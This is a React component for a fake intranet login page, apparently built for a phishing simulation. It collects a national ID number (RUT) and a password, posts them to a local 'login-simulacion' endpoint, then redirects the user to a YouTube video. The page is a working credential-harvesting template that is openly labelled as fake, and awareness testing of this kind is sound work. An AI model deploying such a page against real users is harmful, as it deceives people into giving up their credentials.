import { useState } from 'react';

function LoginFake() {
  const [rut, setRut] = useState('');
  const [password, setPassword] = useState('');
  const [mensaje, setMensaje] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();

    const response = await fetch("http://localhost:3000/api/email/login-simulacion", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ rut, password }),
    });

    const data = await response.json();
    if (response.ok) {
        
        setMensaje('datos enviados');
        setRut('');
        setPassword('');

        const link = "https://www.youtube.com/watch?v=zHDLUbssMIw"
        
        window.open(link, "_blank");

    } else {
        setMensaje('Error al enviar!!');
    }
  };

  return (
    <div className="card">
      <h1>Acceso a la Intranet</h1>
      <form onSubmit={handleSubmit}>
        <input
          type="text"
          placeholder="RUT"
          value={rut}
          onChange={(e) => setRut(e.target.value)}
          required
        /><br />
        <input
          type="password"
          placeholder="Contraseña"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          required
        /><br />
        <button type="submit">Iniciar Sesión</button>
      </form>
      <p>{mensaje}</p>
    </div>
  );
}

export default LoginFake;